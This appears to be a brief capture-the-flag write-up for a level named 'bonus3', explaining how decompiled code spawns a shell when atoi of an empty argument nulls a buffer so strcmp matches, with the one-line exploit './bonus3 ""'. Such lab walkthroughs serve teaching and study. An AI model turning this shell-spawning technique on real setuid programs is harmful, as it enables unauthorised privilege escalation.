We need to pay attention to a few lines for this level:
```c
iVar1 = atoi(param_2[1]);
local_98[iVar1] = '\0'; 
iVar1 = strcmp(local_98,param_2[1]);
if (iVar1 == 0) {
  execl("/bin/sh","sh",0);
}
```

atoi("") return 0.
So after local_98[0] is set to '\0'.
And so we finally get strcmp("","") and tha return 0 because "" == "".

### 2. Write paylaod

We need to pass empty string in the first argument.

### 3. Execute with exploit

```bash
$ ./bonus3 ""
```
